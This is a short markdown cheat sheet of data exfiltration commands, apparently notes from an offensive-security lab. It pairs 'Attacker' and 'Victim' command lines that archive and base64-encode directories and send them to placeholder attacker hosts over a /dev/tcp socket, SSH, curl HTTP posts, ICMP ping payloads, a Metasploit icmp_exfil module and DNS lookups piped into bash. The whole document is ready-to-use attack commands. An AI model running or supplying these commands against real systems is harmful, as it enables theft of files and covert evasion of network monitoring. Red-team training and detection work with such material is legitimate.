# Data Exfiltration
## Exfiltration using TCP socket

```
Attacker : nc -lvp 8080 > /exfil.data
Victim   : tar zcf - exfil_dir/ | base64 | dd conv=ebcdic > /dev/tcp/ATTACKER_IP/ATTACKER_PORT

Attacker : dd conv=ascii if=exfil.data | base64 -d | tar xzvf -
```

## Exfiltration using SSH

```
Victim   : tar zcf - exfil_dir/ | ssh ATTACKER@ATTACKER_IP "cd /tmp/; tar xzpf -"
```

## Exfiltrate using HTTP

```
Victim   : curl --data "file=$(tar zcf - task6 | base64)" http://ATTACKER_DOMAIN.DOMAIN/contact.php

Attacker : sed -i 's/ /+/g' exfil.data
Attacker : cat exfil.data | base64 -d | tar xvfz -
```

## Exfiltration using ICMP

### Manual
```
Attacker : tshark -i INTERFACE -Y "icmp" -T fields -e frame.number -e ip.src -e ip.dst -e icmp.type -e data.data

Victim   : echo "exfiltration_data" | xxd -p > exfil_file
Victim   : ping ATTACKER_IP -c 1 -p $(cat exfil_file)
```

### Using Metasploit

```
Attacker : msf5 > use auxiliary/server/icmp_exfil
Attacker : msf5 > set BPF_FILTER icmp and not src ATTACKER_IP
Attacker : msf5 auxiliary(server/icmp_exfil) > set INTERFACE INTERFACE
Attacker : msf5 auxiliary(server/icmp_exfil) > run

Victim   : sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "BOFexfil_file.txt"
Victim   : sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "exfiltration_data"
Victim   : sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "EOF"
```

## Exfiltration over DNS

```
Victim   : cat exfil_dir/ | base64 | tr -d "\n" | fold -w18 | sed -r 's/.*/&.ATTACKER_DOMAIN.DOMAIN/' 
Victim   : cat exfil_dir/ | base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/ATTACKER_DOMAIN.DOMAIN/ | awk '{print "dig +short " $1}' | bash

Attacker : echo "EXIFLTRATED_DATA.ATTACKER_DOMAIN.DOMAIN" | cut -d"." -f1-8 | tr -d "." | base64 -d
```